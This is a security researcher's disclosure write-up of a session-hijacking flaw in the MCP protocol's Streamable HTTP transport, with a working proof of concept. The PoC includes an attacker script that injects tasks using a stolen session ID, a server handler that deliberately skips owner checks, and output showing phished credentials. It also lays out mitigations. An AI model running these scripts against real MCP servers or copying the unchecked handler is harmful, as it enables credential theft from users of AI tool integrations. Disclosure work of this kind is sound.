---
title: "MCP Phantom Task Injection: Stealing Credentials Through the Server You Trust"
date: 2026-03-03
draft: false
description: "A protocol-level flaw in MCP's Streamable HTTP transport allows an attacker with a leaked session ID to inject phantom tasks into a victim's session, triggering credential elicitation from the legitimate server the victim trusts."
summary: "Fourth article in my MCP security series. By chaining a transport-layer weakness (session ID as sole routing key) with the Tasks and Elicitation systems, an attacker can inject phantom tasks into a victim's MCP session and phish credentials through the legitimate, trusted server. CVSS 8.1 — reported to Anthropic VDP and disclosed. Full technical breakdown with working PoC."
tags: ["mcp", "session-hijacking", "credential-theft", "elicitation", "vulnerability-research", "responsible-disclosure", "bug-bounty", "python"]
categories: ["Vulnerability Research", "Bug Bounty"]
series: ["MCP Security Research"]
series_order: 4
featuredImage: "featured.png"
---

# MCP Phantom Task Injection: Stealing Credentials Through the Server You Trust

> Fourth article in my [MCP security research series](/posts/mcp-svg-icon-xss-to-rce/). After [icon injection](/posts/mcp-svg-icon-xss-to-rce/), [OAuth SSRF](/posts/mcp-ssrf-oauth-prm-discovery/), and [ancestor path traversal](/posts/mcp-ancestor-injection-claude-code/), I looked at the intersection of session management, the Tasks system, and elicitation — and found a way to phish credentials through the server the victim already trusts.

---

## Context and Disclosure

This research was submitted to Anthropic's Vulnerability Disclosure Program on HackerOne with a clean PoC. Anthropic acknowledged the report — *"Thanks for the detailed report and the clean PoC"* — and closed it as **Informative**, reasoning that the attack scenario relies on a server that violates existing spec requirements around elicitation mode (form vs. URL for sensitive data), session identity binding, and task authorization context.

Their position is fair: a fully spec-compliant server would block each step of this chain. That said, Anthropic flagged the finding to the MCP maintainers and acknowledged that the authentication requirements for both Elicitation and Tasks should be made clearer in the spec. The MCP specification has since moved to the Linux Foundation, and MCP repos are now out of bounty scope — reports go directly to the maintainers via GitHub's private vulnerability disclosure process.

With the report closed and no embargo, here are the full technical details. The goal is to document the attack surface so that server implementers understand what the spec requirements are actually protecting against.

---

## Table of Contents

1. [TL;DR](#tldr)
2. [Background: Sessions, Tasks, and Elicitation](#background-sessions-tasks-and-elicitation)
3. [The Vulnerability: Session ID as Sole Routing Key](#the-vulnerability-session-id-as-sole-routing-key)
4. [Session ID Leakage Vectors](#session-id-leakage-vectors)
5. [Attack Flow: Four Phases](#attack-flow-four-phases)
6. [Proof of Concept](#proof-of-concept)
7. [The Vulnerable Code Path](#the-vulnerable-code-path)
8. [PoC Execution: Full Attack Chain](#poc-execution-full-attack-chain)
9. [Difference from CVE-2025-6515](#difference-from-cve-2025-6515)
10. [Impact Analysis](#impact-analysis)
11. [Proposed Mitigations](#proposed-mitigations)
12. [Conclusion](#conclusion)

---

## TL;DR

The MCP specification's Streamable HTTP transport uses the `MCP-Session-Id` header as the sole routing key for requests. For servers without HTTP authentication (common in local and development deployments), **any HTTP client with a leaked session ID can create tasks in the victim's session**. By combining this with the Tasks system and elicitation, an attacker injects a "phantom task" that triggers the legitimate server to send credential prompts to the victim's SSE stream. The victim sees a credential request from the server they trust — not from the attacker. When they respond, the attacker retrieves the captured credentials via `tasks/result`.

**Classification**: Protocol Design Flaw + Transport Vulnerability
**CVSS 3.1**: 8.1 (High) — `AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N`
**Extends**: CVE-2025-6515 (oatpp-mcp session hijacking)

---

## Background: Sessions, Tasks, and Elicitation

This attack chains three MCP features. Each one is well-designed in isolation — the vulnerability emerges at their intersection.

### Streamable HTTP Sessions

The MCP spec ([transports.mdx](https://modelcontextprotocol.io/specification/2025-11-25/basic/transports), §Session Management) defines session management for the Streamable HTTP transport:

- Server assigns an `MCP-Session-Id` header during `initialize`
- Client includes it on **all** subsequent HTTP requests
- Session ID **SHOULD** be globally unique and cryptographically secure (SHOULD, not MUST)
- Servers **MUST NOT** use sessions for authentication ([security best practices](https://modelcontextprotocol.io/specification/2025-11-25/basic/security_best_practices))

Authorization is **optional** for HTTP transport. Local development servers, internal tools, and quick prototypes routinely operate without any authentication layer.

### The Tasks System

[Tasks](https://modelcontextprotocol.io/specification/draft/basic/utilities/tasks) (experimental, added in the 2025-11-25 revision) allow long-running operations:

- A `tools/call` with a `task` parameter creates a server-side task
- Tasks have state transitions: `working` → `input_required` → `completed`
- Tasks persist for their TTL (up to hours)
- Clients poll or receive push notifications via SSE

### Elicitation

[Elicitation](https://modelcontextprotocol.io/specification/2025-11-25/client/elicitation) lets servers request input from users:

- **Form mode**: server sends a JSON schema, client renders a form
- **URL mode**: server sends a URL, client opens it (for OAuth flows, etc.)
- Responses flow back through the same MCP connection

When a task transitions to `input_required`, the server can send an `elicitation/create` request to the client's SSE stream.

### The Intersection

Here's the problem: when a task triggers an elicitation, the elicitation is routed to the **session's** SSE stream. If the task was created by an attacker using a stolen session ID, the elicitation arrives at the **victim's** client — from the **legitimate server** the victim connected to.

---

## The Vulnerability: Session ID as Sole Routing Key

For servers without HTTP authentication, the `MCP-Session-Id` is the **only** piece of information that associates a request with a client. There is:

- **No** client certificate or TLS fingerprint binding
- **No** IP address validation
- **No** request origin verification
- **No** secondary authentication factor
- **No** per-request nonces

This means: if you have the session ID, you **are** the session owner — as far as the server is concerned.

The spec explicitly warns against using session IDs for authentication. But the Tasks system implicitly relies on session identity to route task-triggered messages (notifications, elicitations) to the correct client. This creates a gap: the routing is identity-bound, but the identity is not authenticated.

---

## Session ID Leakage Vectors

The `MCP-Session-Id` is a standard HTTP header, which means it's exposed everywhere HTTP headers are logged, proxied, or inspected:

| Vector | Description | Difficulty |
|--------|-------------|------------|
| **HTTP logs** | Proxies, CDNs, WAFs log request headers including `MCP-Session-Id` | Low |
| **Referrer leakage** | Web client navigating to an external URL (e.g., via URL-mode elicitation) may leak headers | Medium |
| **XSS in web clients** | Cross-site scripting in a web-based MCP client exposes all request headers | Medium |
| **SSRF from other MCP servers** | A [malicious MCP server](/posts/mcp-ssrf-oauth-prm-discovery/) connected to the same host can probe for session info | Medium |
| **Man-in-the-browser** | Malicious browser extension intercepts headers | Medium |
| **Debug/monitoring tools** | Browser DevTools network tab, logging middleware, APM tools | Low |
| **Shared machines** | Multiple users on the same machine, session ID in memory or process logs | Medium |

The session ID doesn't need to be predictable (that was CVE-2025-6515). It just needs to **leak once**.

---

## Attack Flow: Four Phases

```
Phase 1: Session ID Acquisition
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Attacker obtains victim's MCP-Session-Id
via any of the leakage vectors above.

Phase 2: Phantom Task Creation
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Attacker sends a single POST to the MCP server
with the victim's session ID attached.

  POST /mcp HTTP/1.1
  Content-Type: application/json
  MCP-Session-Id: <victim's session ID>

  {
    "jsonrpc": "2.0",
    "id": 99999,
    "method": "tools/call",
    "params": {
      "name": "connect_external_api",
      "arguments": {"service": "corporate-data"},
      "task": {"ttl": 3600000}
    }
  }

Server creates a task in the victim's session.
No origin validation. No IP check.

Phase 3: Elicitation Delivery to Victim
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
The tool execution discovers it needs credentials.
Server transitions the task to input_required.
Server sends elicitation/create to the session's
SSE stream — which is the VICTIM's stream.

The victim receives this from the LEGITIMATE server.
The credential prompt looks like a normal workflow.
There is no indication it was triggered externally.

Phase 4: Credential Exfiltration
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Case A (URL mode): Victim clicks link, completes
  OAuth → tokens bound to attacker's task context.

Case B (Form mode): Victim types credentials in
  form → data captured as elicitation response.

Case C (Side effects): The phantom tool call
  executes actions in the victim's authenticated
  context (DB writes, API calls, file changes).

In all cases, the attacker retrieves the result
by polling tasks/result with the same session ID.
```

The critical insight: the victim is not being phished by the attacker. They're being phished **by the server they trust**. The elicitation request comes from a legitimate server, through a legitimate connection, via a legitimate protocol mechanism. Traditional phishing indicators (suspicious URLs, unknown senders, unusual formatting) are completely absent.

---

## Proof of Concept

The PoC consists of three components simulating the complete attack chain:

```
┌────────────────┐    ┌─────────────────┐    ┌────────────────┐
│ Attacker Script │    │ MCP Server      │    │ Victim Client  │
│ (attacker.py)  │    │ (legitimate)    │    │ (connected)    │
│                │    │                 │    │                │
│ Has: session ID│    │ Creates tasks   │    │ Has: SSE stream│
│ Sends: POST    │───>│ Routes msgs     │───>│ Receives:      │
│                │    │ to session      │    │ elicitation    │
└────────────────┘    └─────────────────┘    └────────────────┘
```

### Component 1: The Vulnerable Server (`evil_server.py`)

A spec-conformant MCP server that supports Tasks and Elicitation. It's called "evil" in the PoC but it's actually a **legitimate** server — the vulnerability is that it creates tasks for any client presenting a valid session ID, without binding tasks to client identity.

The server exposes a single tool, `connect_external_api`, which requires task augmentation and triggers an elicitation flow when called:

```python
TOOL_DEF = {
    "name": "connect_external_api",
    "title": "External API Connector",
    "description": (
        "Connect to an external API service. Requires user authorization "
        "via an elicitation prompt to provide API credentials."
    ),
    "inputSchema": {
        "type": "object",
        "properties": {
            "service": {
                "type": "string",
                "description": "Name of the external API service to connect to"
            }
        },
        "required": ["service"]
    },
    "execution": {
        "taskSupport": "required"
    }
}
```

On initialization, the server assigns a `MCP-Session-Id` and tracks the owner's IP address:

```python
class SessionState:
    def __init__(self, session_id: str, owner_ip: str):
        self.session_id = session_id
        self.owner_ip = owner_ip
        self.initialized = False
        self.tasks = {}               # task_id -> TaskRecord
        self.pending_events = []      # Events to push via SSE
        self.sse_connected = False
```

When a task transitions to `input_required`, the server builds an `elicitation/create` request and queues it for delivery via the session's SSE stream:

```python
def build_elicitation_request(task: TaskRecord, elicitation_id: str) -> dict:
    return {
        "jsonrpc": "2.0",
        "id": int(uuid.uuid4().int % 100000),
        "method": "elicitation/create",
        "params": {
            "mode": "form",
            "message": (
                f"The tool '{task.tool_name}' requires authorization to "
                f"access the '{task.arguments.get('service', 'unknown')}' "
                f"service. Please provide your credentials below."
            ),
            "requestedSchema": {
                "type": "object",
                "properties": {
                    "username": {
                        "type": "string",
                        "title": "Service Username",
                        "description": "Your username for the external service"
                    },
                    "password": {
                        "type": "string",
                        "title": "Service Password",
                        "description": "Your password for the external service"
                    },
                    "api_key": {
                        "type": "string",
                        "title": "API Key (optional)",
                        "description": "API key if required by the service"
                    }
                },
                "required": ["username", "password"]
            },
            "_meta": {
                "elicitationId": elicitation_id,
                "io.modelcontextprotocol/related-task": {
                    "taskId": task.task_id
                }
            }
        }
    }
```

### Component 2: The Attacker (`attacker.py`)

A minimal script that sends a single POST request with the stolen session ID. That's it — one HTTP request is all it takes:

```python
def inject_phantom_task(server_url: str, session_id: str,
                        tool_name: str = "connect_external_api",
                        tool_args: dict = None):
    if tool_args is None:
        tool_args = {"service": "corporate-data-api"}

    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json, text/event-stream",
        "MCP-Session-Id": session_id,
        "MCP-Protocol-Version": "2025-11-25",
    }

    payload = {
        "jsonrpc": "2.0",
        "id": 99999,
        "method": "tools/call",
        "params": {
            "name": tool_name,
            "arguments": tool_args,
            "task": {
                "ttl": 3600000  # 1 hour persistence
            }
        }
    }

    resp = requests.post(server_url, json=payload, headers=headers, timeout=10)
```

After injection, the attacker can poll for the task result to retrieve whatever the victim submitted:

```python
def poll_phantom_task(server_url: str, session_id: str, task_id: str):
    payload = {
        "jsonrpc": "2.0",
        "id": 99997,
        "method": "tasks/result",
        "params": {"taskId": task_id}
    }

    resp = requests.post(server_url, json=payload, headers=headers, timeout=10)
```

### Component 3: The Victim Client (`victim_client.py`)

A conformant MCP client that connects to the server, opens an SSE stream, and processes incoming messages. When it receives an `elicitation/create`, it renders the credential form.

The client includes phantom task detection logic — it tracks which tasks it initiated and flags unknown ones:

```python
async def _handle_elicitation(self, message: dict, msg_id,
                              session: aiohttp.ClientSession):
    params = message.get("params", {})
    meta = params.get("_meta", {})
    related_task = meta.get("io.modelcontextprotocol/related-task", {})
    related_task_id = related_task.get("taskId", "none")

    # Check if this task was initiated by us
    if related_task_id not in self.known_tasks:
        log.warning("  (!) WARNING: This elicitation references a task")
        log.warning(f"      ({related_task_id}) that this client did NOT initiate!")
        log.warning("      This could be a PHANTOM TASK INJECTION attack.")
```

But this is a **client-side** mitigation that requires the client to track task provenance. Standard MCP clients today do not do this.

---

## The Vulnerable Code Path

The core vulnerability is in the `tools/call` handler. The server creates a task in the session context **without verifying that the requester is the session owner**:

```python
if method == "tools/call":
    params = body.get("params", {})
    tool_name = params.get("name", "")
    arguments = params.get("arguments", {})
    task_params = params.get("task", {})

    # ════════════════════════════════════════════════════════════
    # THE VULNERABILITY: We create the task in the session context
    # without verifying that the requester is the session OWNER.
    # The spec says MCP-Session-Id is for routing, not auth —
    # so any client with the session ID can create tasks here.
    # ════════════════════════════════════════════════════════════

    task_id = f"task-{uuid.uuid4().hex[:12]}"
    ttl = task_params.get("ttl", 60000)

    task = TaskRecord(
        task_id=task_id,
        tool_name=tool_name,
        arguments=arguments,
        creator_ip=client_ip,
        session_id=session.session_id,
        ttl=ttl,
    )

    # Detect phantom tasks: different IP from session owner
    is_phantom = (client_ip != session.owner_ip)
    task.is_phantom = is_phantom

    session.tasks[task_id] = task
```

The server **detects** that the request comes from a different IP (`is_phantom = True`) but **does not prevent** the task from being created. This is because the spec says sessions are for routing, not authentication — the server has no protocol-level basis to reject the request.

The elicitation triggered by this phantom task is then queued for delivery to the session's SSE stream — the victim's stream:

```python
def _transition_task_to_input_required(state, session, task):
    task.status = "input_required"
    task.elicitation_id = f"elicit-{uuid.uuid4().hex[:8]}"

    # Build elicitation request and queue it for SSE delivery
    elicitation = build_elicitation_request(task, task.elicitation_id)
    session.pending_events.append(build_task_notification(task))
    session.pending_events.append(elicitation)

    if task.is_phantom:
        log.warning(
            f"  Elicitation queued for delivery to victim's SSE stream "
            f"(session owner: {session.owner_ip})"
        )
```

---

## PoC Execution: Full Attack Chain

```bash
# Terminal 1: Start the legitimate server
python poc/evil_server.py --port 8080

# Terminal 2: Start the victim client (connects, gets session ID)
python poc/victim_client.py --server http://localhost:8080/mcp --auto-approve

# Terminal 3: Run the attacker with the stolen session ID
python poc/attacker.py --server http://localhost:8080/mcp \
  --session-id "<victim's session ID>" --poll
```

### Output: Attacker

```
============================================================
PHANTOM TASK INJECTION
============================================================
Target server: http://localhost:18013/mcp
Stolen session ID: 47995dad-616d-44...
Tool: connect_external_api
Arguments: {"service": "corporate-data-api"}

Response status: 200
[SUCCESS] Phantom task created!
  Task ID: task-675119bd7c72
  Status: working
  TTL: 3600000ms

The victim's client will now receive any
elicitation/notification triggered by this task.
The messages will appear to come from the
legitimate server the victim trusts.
```

### Output: Server

```
[TASK] Created: task-675119bd7c72 in session 47995dad-616d-44...
  Tool: connect_external_api, Args: {"service": "corporate-data-api"}
[TASK] task-675119bd7c72 -> input_required (elicitation elicit-d615270f)
[SSE] Sent event #2: notifications/tasks/changed
[SSE] Sent event #3: elicitation/create
[ELICITATION] Response received for task task-675119bd7c72
  Data: {
    "username": "victim.user@company.com",
    "password": "S3cur3P@ssw0rd!",
    "api_key": "ak_live_xK9mP2nQ7rS4tU6v"
  }
```

### Output: Victim Client

```
============================================================
[ELICITATION] Server is requesting user input!
============================================================
  Mode:           form
  Message:        The tool 'connect_external_api' requires authorization
                  to access the 'corporate-data-api' service.
  Related task:   task-675119bd7c72
  Required fields:
    - Service Username *
    - Service Password *
    - API Key (optional)

[AUTO-APPROVE] Automatically accepting elicitation...
  Sent: {
    "username": "victim.user@company.com",
    "password": "S3cur3P@ssw0rd!",
    "api_key": "ak_live_xK9mP2nQ7rS4tU6v"
  }
  In a real attack, these would be the victim's actual credentials.
```

The complete chain:

1. **Attacker** sends one POST with the stolen session ID → phantom task is created
2. **Server** transitions the task to `input_required`, queues elicitation for SSE delivery
3. **Victim** receives the elicitation from the **legitimate, trusted server** and provides credentials
4. **Attacker** polls `tasks/result` to retrieve the victim's credentials

The victim has **no indication** this was triggered by an external attacker.

---

## Difference from CVE-2025-6515

| Aspect | CVE-2025-6515 | Phantom Task Injection |
|--------|---------------|------------------------|
| **Scope** | oatpp-mcp specific | Protocol-level (any implementation) |
| **Root cause** | Predictable session IDs | Any session ID leakage |
| **Action** | Generic session hijack | Targeted phantom task + elicitation |
| **Detection** | Attacker sends arbitrary requests | Elicitation comes from trusted server |
| **Persistence** | Request-level | Task-level (persists for TTL, up to hours) |
| **Victim experience** | Unexpected server responses | Legitimate-looking credential prompt |
| **Exfiltration** | Direct session takeover | Indirect, via `tasks/result` |

CVE-2025-6515 focused on **predictable** session IDs. This attack works with **any** session ID leakage — the ID can be cryptographically random, properly generated, and still exploitable once leaked.

---

## Impact Analysis

### Confidentiality: HIGH

- Victim provides real credentials through a trusted UI from a trusted server
- Task results may contain sensitive data from the victim's authenticated context
- OAuth tokens from URL-mode elicitation bound to the attacker's task context

### Integrity: HIGH

- Phantom tool calls execute actions in the victim's authenticated context
- Database modifications, API calls, file changes all happen under the victim's identity
- Audit trails show the victim as the actor — the attacker is invisible

### Availability: LOW

- Phantom tasks consume server resources but are limited by TTL
- No direct denial of service (though resource exhaustion is theoretically possible with many phantom tasks)

---

## Proposed Mitigations

### Protocol-Level

1. **MUST** bind tasks to transport-level client identity (IP, TLS certificate, client fingerprint) in addition to the session ID
2. **MUST** require HTTP Authorization for all Streamable HTTP sessions that support Tasks
3. **SHOULD** implement per-request nonces to prevent replay
4. **MUST** validate that task-triggered messages (elicitations, notifications) are only delivered to the SSE stream of the original task requestor

### Server-Level

1. Track origin IP and fingerprint of task creators
2. Reject `tasks/get` and `tasks/result` from different origins than the task creator
3. Log and alert on multiple client origins per session
4. Implement HMAC-signed session tokens that bind to client identity

### Client-Level

1. Track which tasks were user-initiated vs. server-initiated — flag unexpected elicitations
2. Display clear indicators for task notifications referencing unknown task IDs
3. Require explicit re-authentication for elicitations from untracked task contexts
4. Protect the session ID from leakage: set `Referrer-Policy: no-referrer`, apply CSP headers

---

## Conclusion

Phantom Task Injection is a protocol-level attack that turns a trusted MCP server into an unwitting phishing proxy. The attacker never interacts with the victim directly — everything flows through the legitimate server, over the legitimate connection, using legitimate protocol mechanisms. Traditional phishing defenses (URL inspection, sender verification, domain checks) are completely bypassed because there's nothing fake to detect.

The spec does contain the requirements that would prevent this attack if strictly followed: form-mode elicitation must not request sensitive data, session state must be bound to client identity, and `tasks/result` must enforce authorization context. But these are scattered across different sections and their combined importance — as a defense against this specific attack chain — isn't obvious to implementers. Making these requirements more prominent, and explaining the attack they prevent, would go a long way toward hardening the ecosystem.

For server developers: **do not rely on `MCP-Session-Id` alone for task authorization**. Bind tasks to the client's transport-level identity. Require HTTP authentication for any deployment that exposes Tasks or Elicitation. And treat the session ID as a routing token — never as proof of identity.

---

*This research was submitted to Anthropic's Vulnerability Disclosure Program and disclosed after closure. The PoC is available for authorized security research.*
